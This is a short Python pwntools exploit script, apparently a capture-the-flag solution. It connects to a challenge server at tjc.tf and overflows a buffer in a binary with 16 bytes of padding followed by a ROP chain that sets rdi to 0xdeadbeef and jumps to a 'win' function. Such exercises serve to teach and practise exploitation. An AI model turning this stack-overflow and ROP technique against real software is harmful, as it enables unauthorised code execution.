#!/usr/bin/env python3

from pwn import *

exe = ELF("./out")

context.binary = exe


def conn():
    if args.LOCAL:
        r = gdb.debug([exe.path])
        #r = process([exe.path])
        #if args.DEBUG:
            #gdb.attach(r)
    else:
        r = remote("tjc.tf", 31457)

    return r


def main():
    r = conn()

    rop = ROP(exe)
    rop.raw(rop.find_gadget(['ret']))
    rop(rdi=0xdeadbeef)
    rop.raw(exe.symbols.win)
    log.info(rop.dump())

    r.sendline(b'A'*16 + rop.chain())

    while True:
        print(r.recvline())

    r.interactive()


if __name__ == "__main__":
    main()
